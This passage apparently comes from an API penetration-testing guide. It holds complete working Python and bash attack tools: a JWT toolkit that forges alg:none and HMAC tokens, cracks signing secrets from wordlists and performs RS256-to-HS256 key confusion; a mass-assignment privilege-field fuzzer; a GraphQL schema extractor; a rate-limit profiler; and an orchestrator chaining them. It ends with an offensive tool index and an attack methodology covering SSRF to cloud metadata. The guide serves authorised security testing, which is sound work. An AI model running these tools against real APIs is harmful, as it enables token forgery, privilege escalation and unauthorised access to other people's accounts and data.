          f"{b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"

    if args.alg == "HS256":
        sig = hmac.new(args.secret.encode(), seg.encode(), hashlib.sha256).digest()
    elif args.alg == "HS384":
        sig = hmac.new(args.secret.encode(), seg.encode(), hashlib.sha384).digest()
    elif args.alg == "HS512":
        sig = hmac.new(args.secret.encode(), seg.encode(), hashlib.sha512).digest()
    else:
        sys.exit(f"Unsupported alg for forging: {args.alg} (use HS256/HS384/HS512, or 'none' command)")

    token = f"{seg}.{b64url_encode(sig)}"
    print("[+] Forged token:")
    print(token)
    print("\n[+] Modified payload:")
    print(json.dumps(payload, indent=2))


def cmd_crack(args):
    header, payload, sig_b64 = split_token(args.token)
    alg = header.get("alg", "HS256").upper()
    hashfn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg)
    if not hashfn:
        sys.exit(f"Cracking only supports HS256/HS384/HS512 (token uses {alg})")

    parts = args.token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64url_decode(sig_b64)

    print(f"[*] Cracking {alg} secret using {args.wordlist} ...")
    count = 0
    start = time.time()
    with open(args.wordlist, "r", errors="ignore") as f:
        for line in f:
            secret = line.rstrip("\n")
            if not secret:
                continue
            count += 1
            test_sig = hmac.new(secret.encode(), signing_input, hashfn).digest()
            if hmac.compare_digest(test_sig, target_sig):
                print(f"\n[+] SECRET FOUND: '{secret}'")
                print(f"[+] Tested {count} candidates in {time.time()-start:.1f}s")
                return
            if count % 500000 == 0:
                print(f"    ... {count} tested ({count/(time.time()-start):.0f}/s)")
    print(f"[-] Not found in {count} candidates ({time.time()-start:.1f}s)")


def cmd_confuse(args):
    """RS256 -> HS256 key-confusion forge using the RSA public key as the HMAC secret."""
    header, payload, _ = split_token(args.token)
    with open(args.pubkey, "rb") as f:
        pubkey_bytes = f.read()

    for claim in args.claim or []:
        k, v = claim.split("=", 1)
        payload[k] = v

    header["alg"] = "HS256"
    seg = f"{b64url_encode(json.dumps(header, separators=(',', ':')).encode())}." \
          f"{b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"
    sig = hmac.new(pubkey_bytes, seg.encode(), hashlib.sha256).digest()
    token = f"{seg}.{b64url_encode(sig)}"
    print("[+] Algorithm-confusion forged token (RS256 pubkey used as HS256 secret):")
    print(token)
    print("[!] Only works if the server's JWT library doesn't enforce the expected algorithm.")


def main():
    ap = argparse.ArgumentParser(description="Standalone JWT attack toolkit")
    sub = ap.add_subparsers(dest="command", required=True)

    p = sub.add_parser("decode", help="Decode and pretty-print a JWT")
    p.add_argument("token")
    p.set_defaults(func=cmd_decode)

    p = sub.add_parser("none", help="Forge an alg:none token")
    p.add_argument("token")
    p.set_defaults(func=cmd_none)

    p = sub.add_parser("forge", help="Forge a token with a known/cracked HMAC secret")
    p.add_argument("token")
    p.add_argument("--secret", required=True)
    p.add_argument("--alg", default="HS256", choices=["HS256", "HS384", "HS512"])
    p.add_argument("--claim", action="append", help="key=value, repeatable")
    p.set_defaults(func=cmd_forge)

    p = sub.add_parser("crack", help="Offline dictionary crack of the HMAC secret")
    p.add_argument("token")
    p.add_argument("--wordlist", required=True)
    p.set_defaults(func=cmd_crack)

    p = sub.add_parser("confuse", help="RS256->HS256 algorithm confusion forge")
    p.add_argument("token")
    p.add_argument("--pubkey", required=True, help="Path to the RSA public key (.pem)")
    p.add_argument("--claim", action="append")
    p.set_defaults(func=cmd_confuse)

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
```

---

### Script 4 — `mass_assign_fuzzer.py`
**Mass assignment / hidden-field scanner** — sends a baseline request, then one request per candidate
privilege field, diffs response size/status against baseline, and flags anything that changed behavior.

```python
#!/usr/bin/env python3
"""
mass_assign_fuzzer.py — Mass assignment / hidden privileged-field scanner.

Usage:
  python3 mass_assign_fuzzer.py \
    --url https://target.com/api/v1/register \
    --method POST \
    --base-body '{"username":"fuzztest","email":"fuzz@test.com","password":"Password1!"}' \
    --token "Bearer TOKEN" \
    --out mass_assign_results
"""

import argparse
import json
import sys
from pathlib import Path

try:
    import requests
except ImportError:
    sys.exit("Missing dependency: pip install requests")


DEFAULT_FIELDS = [
    "admin", "isAdmin", "is_admin", "role", "roles", "user_role", "account_type",
    "accountType", "permission", "permissions", "privilege", "isPremium", "is_premium",
    "verified", "is_verified", "active", "enabled", "approved", "status",
    "balance", "credit", "credits", "discount", "price", "superuser", "is_staff",
    "group", "org", "organization_id", "tenant_id", "plan", "subscription_tier",
]


def send(url, method, body, headers, timeout=15):
    try:
        r = requests.request(method, url, json=body, headers=headers, timeout=timeout)
        return r.status_code, len(r.content), r.text[:300]
    except requests.RequestException as e:
        return -1, 0, str(e)


def main():
    ap = argparse.ArgumentParser(description="Mass assignment / hidden field scanner")
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", default="POST")
    ap.add_argument("--base-body", required=True, help="JSON string of the normal/expected request body")
    ap.add_argument("--token", default=None, help="Authorization header value")
    ap.add_argument("--fields", default=None, help="Path to custom newline-separated field wordlist")
    ap.add_argument("--out", default="mass_assign_results")
    args = ap.parse_args()

    base_body = json.loads(args.base_body)
    headers = {"Content-Type": "application/json"}
    if args.token:
        headers["Authorization"] = args.token

    fields = DEFAULT_FIELDS
    if args.fields:
        fields = [l.strip() for l in open(args.fields) if l.strip()]

    print(f"[*] Baseline request...")
    base_status, base_len, _ = send(args.url, args.method, base_body, headers)
    print(f"    Baseline: status={base_status} len={base_len}")

    results = []
    for field in fields:
        for value in (True, 1, "admin"):
            body = dict(base_body)
            body[field] = value
            status, length, snippet = send(args.url, args.method, body, headers)
            diff = (status != base_status) or (abs(length - base_len) > 5)
            results.append({
                "field": field, "value": value, "status": status, "length": length,
                "baseline_status": base_status, "baseline_length": base_len,
                "anomalous": diff, "snippet": snippet if diff else "",
            })
            flag = " <-- ANOMALY" if diff else ""
            print(f"  {field:20} = {str(value):8} -> status={status} len={length}{flag}")

    outdir = Path(args.out)
    outdir.mkdir(parents=True, exist_ok=True)
    with open(outdir / "results.json", "w") as f:
        json.dump(results, f, indent=2)

    anomalies = [r for r in results if r["anomalous"]]
    with open(outdir / "report.md", "w") as f:
        f.write("# Mass Assignment Fuzz Report\n\n")
        f.write(f"Baseline: status={base_status}, length={base_len}\n\n")
        f.write(f"**{len(anomalies)} anomalous field/value combos found** (out of {len(results)} tested)\n\n")
        if anomalies:
            f.write("| Field | Value | Status | Length |\n|---|---|---|---|\n")
            for a in anomalies:
                f.write(f"| {a['field']} | {a['value']} | {a['status']} | {a['length']} |\n")

    print(f"\n[+] {len(anomalies)} anomalies found. Reports in {outdir}/")


if __name__ == "__main__":
    main()
```

---

### Script 5 — `graphql_recon.py`
**GraphQL schema dumper + attack-surface extractor** — runs introspection (or falls back to field-
suggestion probing if introspection is disabled), then dumps every query/mutation into a Markdown
cheat sheet ready to attack.

```python
#!/usr/bin/env python3
"""
graphql_recon.py — GraphQL introspection dumper & attack-surface mapper.

Usage:
  python3 graphql_recon.py --url https://target.com/graphql --out graphql_recon
  python3 graphql_recon.py --url https://target.com/graphql --token "Bearer TOKEN" --out graphql_recon
"""

import argparse
import json
import sys
from pathlib import Path

try:
    import requests
except ImportError:
    sys.exit("Missing dependency: pip install requests")

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind ofType { name kind } } }
      }
    }
  }
}
"""


def run_query(url, query, headers, variables=None):
    body = {"query": query}
    if variables:
        body["variables"] = variables
    r = requests.post(url, json=body, headers=headers, timeout=20)
    try:
        return r.status_code, r.json()
    except ValueError:
        return r.status_code, {"raw": r.text[:500]}


def check_field_suggestion(url, headers):
    """If introspection is off, probe with a deliberately misspelled field to trigger
    'Did you mean ...' suggestions that leak real field/type names."""
    status, data = run_query(url, "query{ qqqqnonexistentfield }", headers)
    errors = data.get("errors", []) if isinstance(data, dict) else []
    suggestions = []
    for e in errors:
        msg = e.get("message", "")
        if "did you mean" in msg.lower():
            suggestions.append(msg)
    return suggestions


def main():
    ap = argparse.ArgumentParser(description="GraphQL recon / schema extraction tool")
    ap.add_argument("--url", required=True)
    ap.add_argument("--token", default=None)
    ap.add_argument("--out", default="graphql_recon")
    args = ap.parse_args()

    headers = {"Content-Type": "application/json"}
    if args.token:
        headers["Authorization"] = args.token

    outdir = Path(args.out)
    outdir.mkdir(parents=True, exist_ok=True)

    print("[*] Attempting introspection...")
    status, data = run_query(args.url, INTROSPECTION_QUERY, headers)

    schema = data.get("data", {}).get("__schema") if isinstance(data, dict) else None

    if schema:
        print("[+] Introspection ENABLED — full schema recovered.")
        with open(outdir / "schema.json", "w") as f:
            json.dump(schema, f, indent=2)

        query_type = schema.get("queryType", {}).get("name")
        mutation_type = schema.get("mutationType", {}).get("name")
        types = {t["name"]: t for t in schema.get("types", []) if t.get("name")}

        with open(outdir / "ATTACK_SURFACE.md", "w") as f:
            f.write(f"# GraphQL Attack Surface — {args.url}\n\n")

            for label, type_name in [("Queries", query_type), ("Mutations", mutation_type)]:
                f.write(f"## {label}\n\n")
                t = types.get(type_name, {})
                for field in t.get("fields") or []:
                    args_str = ", ".join(
                        f"{a['name']}: {(a['type'].get('name') or a['type'].get('ofType', {}).get('name', '?'))}"
                        for a in field.get("args", [])
                    )
                    f.write(f"- **{field['name']}**({args_str})")
                    if field.get("description"):
                        f.write(f" — {field['description']}")
                    f.write("\n")
                f.write("\n")

            f.write("## All Types (look for Admin/Internal/Secret in names)\n\n")
            for name in sorted(types.keys()):
                if not name.startswith("__"):
                    flag = " ⚠️" if any(w in name.lower() for w in
                                        ["admin", "internal", "secret", "debug", "private"]) else ""
                    f.write(f"- {name}{flag}\n")

        print(f"[+] Attack surface map written to {outdir}/ATTACK_SURFACE.md")

    else:
        print("[-] Introspection appears DISABLED. Trying field-suggestion leak technique...")
        suggestions = check_field_suggestion(args.url, headers)
        with open(outdir / "field_suggestions.txt", "w") as f:
            if suggestions:
                f.write("\n".join(suggestions))
                print(f"[+] {len(suggestions)} field-name leaks found via error suggestions.")
            else:
                f.write("No suggestions leaked. Try clairvoyance for brute-force schema recovery:\n")
                f.write(f"  clairvoyance -o schema.json {args.url}\n")
                print("[-] No leaks found via suggestion technique. Recommend trying `clairvoyance`.")

    # Always check batching support (DoS-relevant, API4/API6:2023)
    print("[*] Testing batch-query support (DoS surface)...")
    batch_status, batch_data = run_query(
        args.url, None, headers, variables=None
    ) if False else (None, None)  # placeholder to keep single-query helper reusable

    batch_body = [{"query": "{__typename}"}] * 5
    r = requests.post(args.url, json=batch_body, headers=headers, timeout=20)
    if r.status_code == 200 and isinstance(r.json(), list):
        print("[!] Batching is ALLOWED — can be abused for brute force / rate-limit bypass / DoS.")
    else:
        print("[+] Batching appears blocked or unsupported.")


if __name__ == "__main__":
    main()
```

---

### Script 6 — `rate_limit_profiler.py`
**Rate-limit/WAF behavior profiler** — fires a calibrated burst, records exactly when/how blocking
kicks in (status code, header, timing), so you don't have to manually count requests before a ban.

```python
#!/usr/bin/env python3
"""
rate_limit_profiler.py — Profiles an endpoint's rate limiting behavior.

Usage:
  python3 rate_limit_profiler.py --url https://target.com/api/v1/login \
    --method POST --body '{"user":"a","pass":"b"}' --max-requests 200 --out rl_profile
"""

import argparse
import json
import time
from pathlib import Path

import requests


def main():
    ap = argparse.ArgumentParser(description="Rate limit behavior profiler")
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--body", default=None, help="JSON body string (for POST/PUT)")
    ap.add_argument("--headers", action="append", default=[], help="header:value, repeatable")
    ap.add_argument("--max-requests", type=int, default=200)
    ap.add_argument("--out", default="rate_limit_profile")
    args = ap.parse_args()

    headers = {}
    for h in args.headers:
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()
    body = json.loads(args.body) if args.body else None

    results = []
    blocked_at = None
    start = time.time()

    print(f"[*] Firing up to {args.max_requests} requests at {args.url} ...")
    for i in range(1, args.max_requests + 1):
        t0 = time.time()
        try:
            r = requests.request(args.method, args.url, json=body, headers=headers, timeout=10)
            elapsed = time.time() - t0
            rl_headers = {k: v for k, v in r.headers.items() if "rate" in k.lower() or "retry" in k.lower()}
            results.append({
                "n": i, "status": r.status_code, "elapsed": round(elapsed, 3),
                "rate_limit_headers": rl_headers, "len": len(r.content),
            })
            if blocked_at is None and r.status_code in (429, 403):
                blocked_at = i
                print(f"[!] First blocking response at request #{i} (status {r.status_code})")
                print(f"    Headers: {rl_headers}")
        except requests.RequestException as e:
            results.append({"n": i, "status": -1, "error": str(e)})

        if i % 25 == 0:
            print(f"    ... {i}/{args.max_requests} sent ({i/(time.time()-start):.1f} req/s)")

    outdir = Path(args.out)
    outdir.mkdir(parents=True, exist_ok=True)
    with open(outdir / "profile.json", "w") as f:
        json.dump(results, f, indent=2)

    with open(outdir / "SUMMARY.md", "w") as f:
        f.write(f"# Rate Limit Profile — {args.url}\n\n")
        f.write(f"Total requests sent: {len(results)}  \n")
        f.write(f"Total time: {time.time()-start:.1f}s  \n")
        f.write(f"First block observed at request: **{blocked_at or 'Never (no rate limit detected!)'}**\n\n")
        if not blocked_at:
            f.write("⚠️ No rate limiting detected within tested range — flag as a finding "
                    "(API4:2023 Unrestricted Resource Consumption).\n")

    print(f"\n[+] Done. Report: {outdir}/SUMMARY.md")
    if not blocked_at:
        print("[!] NO RATE LIMITING DETECTED — this is itself a reportable finding.")


if __name__ == "__main__":
    main()
```

---

### Script 7 — `master_orchestrator.sh`
**One command to run the whole chain** — recon → GraphQL check → rate-limit profile → mass-assignment
sweep → (optional) BOLA sweep if you supply two tokens. Ties every script above together.

```bash
#!/usr/bin/env bash
#
# master_orchestrator.sh — Run the full API testing automation chain in one shot.
# Usage: ./master_orchestrator.sh target.com [token_a] [token_b]
#
set -euo pipefail

TARGET="${1:?Usage: $0 <target.com> [token_a] [token_b]}"
TOKEN_A="${2:-}"
TOKEN_B="${3:-}"
OUTDIR="./engagement_${TARGET}_$(date +%Y%m%d)"
mkdir -p "$OUTDIR"

echo "=== [1/4] Recon ==="
./api_recon.sh "$TARGET" "$OUTDIR/recon"

echo "=== [2/4] GraphQL check (if endpoint found) ==="
GQL_URL=$(grep -im1 'graphql' "$OUTDIR/recon/api_candidates.txt" || true)
if [ -n "$GQL_URL" ]; then
  python3 graphql_recon.py --url "$GQL_URL" ${TOKEN_B:+--token "$TOKEN_B"} --out "$OUTDIR/graphql"
else
  echo "No GraphQL endpoint found in recon results."
fi

echo "=== [3/4] Rate limit profile on first discovered API endpoint ==="
FIRST_API=$(head -n1 "$OUTDIR/recon/api_candidates.txt" || true)
if [ -n "$FIRST_API" ]; then
  python3 rate_limit_profiler.py --url "$FIRST_API" --max-requests 100 --out "$OUTDIR/rate_limit"
fi

echo "=== [4/4] BOLA sweep (only if both tokens supplied) ==="
if [ -n "$TOKEN_A" ] && [ -n "$TOKEN_B" ]; then
  python3 bola_hunter.py \
    --url "${FIRST_API%/*}/{id}" \
    --token-a "$TOKEN_A" --token-b "$TOKEN_B" \
    --ids 1-200 --out "$OUTDIR/bola"
else
  echo "Skipping BOLA sweep — pass TOKEN_A and TOKEN_B to enable."
fi

echo ""
echo "=========================================="
echo " All results saved under: $OUTDIR"
echo "=========================================="
```

---

### How these fit the chapter workflow
| Script | Replaces manual work from | Typical time saved |
|---|---|---|
| `api_recon.sh` | Ch.6 Discovery (full chapter) | 30–60 min → ~5 min |
| `bola_hunter.py` | Ch.10 A-B testing, done by hand in Postman/Burp | 1–2 hrs → ~2 min per 500 IDs |
| `jwt_toolkit.py` | Ch.8 JWT attacks, normally multi-tool (jwt.io + Burp Decoder + jwt_tool) | 20–30 min → ~1 min |
| `mass_assign_fuzzer.py` | Ch.11 manual field guessing | 30–45 min → ~2 min |
| `graphql_recon.py` | Ch.14 manual introspection + doc reading | 20–30 min → ~1 min |
| `rate_limit_profiler.py` | Ch.13 manual counting of requests until blocked | 15–20 min → ~3 min |
| `master_orchestrator.sh` | Running Ch.6/8/13/14 back-to-back manually at the start of every engagement | Hours → one command |

---

## Quick Tool Index

| Tool | Primary Use | Core Command |
|---|---|---|
| Nmap | Port/service discovery | `nmap -sC -sV <target> -oA out` |
| Amass | Subdomain/attack-surface recon | `amass enum -passive -d <domain>` |
| Nikto | Web/API vuln surface scan | `nikto -h <url>` |
| Gobuster | Directory brute force | `gobuster dir -u <url> -w <wordlist>` |
| Kiterunner | API-aware endpoint discovery | `kr scan <url> -w <kite-wordlist>` |
| OWASP ZAP | Crawl + active scan | GUI: Quick Start → Attack |
| Burp Suite | Intercept/Repeater/Intruder/Sequencer/Decoder/Comparer | GUI-driven |
| Postman | Build/replay/collection-run API requests | GUI + Collection Runner |
| Wfuzz | CLI fuzzing (auth, injection, rate-limit, evasion) | `wfuzz -z file,<wl> -u <url>` |
| Arjun | Parameter discovery / mass assignment | `arjun -u <url> -m JSON` |
| SQLmap | SQL injection exploitation | `sqlmap -r <req> -p <param>` |
| JWT_Tool | JWT analysis/forging/cracking | `jwt_tool <token> -C -d <wordlist>` |
| IP Rotate (Burp ext) | Rotate source IP via AWS API Gateway | GUI, needs AWS keys |
| InQL (Burp ext) | GraphQL schema scanning | GUI, needs target GraphQL URL |
| **ffuf** | Fast Go-based fuzzing (dirs/params) | `ffuf -u URL/FUZZ -w wordlist -mc 200` |
| **nuclei** | Template-driven vuln/exposure scanning | `nuclei -u URL -tags api` |
| **Schemathesis** | Spec-driven property-based API fuzzing | `schemathesis run <openapi-url>` |
| **Newman** | Headless/CI Postman collection runner | `newman run collection.json -e env.json` |
| **graphql-cop** | Automated GraphQL misconfig checks | `graphql-cop -t <url>` |
| **clairvoyance** | Recover GraphQL schema w/o introspection | `clairvoyance -o out.json <url>` |
| **GraphQLmap** | Interactive GraphQL exploitation shell | `python3 graphqlmap.py -u <url>` |
| **jwt-hack** | Fast JWT decode/sign/crack (Go) | `jwt-hack crack -w rockyou.txt <token>` |
| **mitmproxy/mitmdump** | Scriptable proxy, headless automation | `mitmdump -s script.py` |
| **grpcurl** | gRPC service enumeration/calls | `grpcurl -plaintext host:port list` |
| **wscat** | Manual WebSocket API testing | `wscat -c wss://host/ws` |
| **Turbo Intruder (Burp ext)** | Race-condition/single-packet attacks | GUI + Python script |
| **httpx/subfinder/katana (ProjectDiscovery)** | Modern recon chain | `subfinder \| httpx \| katana` |

---

## Overall Sequential Methodology (Ch.6–14 flow, 2026-updated)

1. **Discovery** (Ch.6 + §A): passive OSINT → active scanning → modern recon chain (subfinder/httpx/katana) → find API existence/endpoints, including shadow/zombie APIs (§U).
2. **Lab/Tooling setup** (Ch.4/5 refs + §A–C): Burp/Caido, Postman/Newman, Kiterunner, ffuf, nuclei, vulnerable targets.
3. **Endpoint Analysis** (Ch.7): docs/specs → build Postman collection → run **Schemathesis** against any discovered OpenAPI spec (§D) → use API as intended → spot info disclosure/misconfig/excessive data/business logic flaws.
4. **Attacking Authentication** (Ch.8 + §G): brute force, password spraying, token forging, JWT attacks (jwt_tool + jwt-hack + manual Python forge scripts), OAuth/OIDC checklist (§R).
5. **Fuzzing** (Ch.9 + §B/§C): wide (Postman/Newman) + deep (Burp/Wfuzz/ffuf) + template-driven (nuclei) to surface hidden vulnerabilities & improper inventory management issues.
6. **Authorization Exploitation** (Ch.10 + §H): BOLA/BFLA via A-B / A-B-A testing, automated with async Python sweepers.
7. **Mass Assignment / Property-Level Authz** (Ch.11 + §H): inject unauthorized fields into client-writable requests; automate candidate-field brute forcing.
8. **Injection** (Ch.12): XSS/XAS, SQLi, NoSQLi, OS command injection — now also gRPC/Protobuf field injection (§M) and WebSocket message injection (§N).
9. **SSRF & Cloud/Container Pivoting** (§P/§Q — new standalone category, API7:2023): abuse webhook/import-URL fields to reach cloud metadata endpoints and K8s API servers.
10. **Evasion, Rate Limits & Race Conditions** (Ch.13 + §O): bypass WAF/rate-limit controls; use Turbo Intruder for single-packet race attacks that defeat naive uniqueness/rate checks.
11. **GraphQL-specific Attacks** (Ch.14 + §F): apply the same methodology adapted to GraphQL's single-endpoint/introspection model, plus schema recovery when introspection is disabled, batching DoS, and depth/alias DoS.
12. **Protocol-layer checks** (§L/§M/§N): HTTP/2 downgrade smuggling, gRPC reflection abuse, WebSocket auth gaps — increasingly common in 2025–2026 microservice/gateway architectures.
13. **Reporting**: map every finding to **OWASP API Security Top 10:2023** (§T) rather than the 2019 list for current-dated engagements.
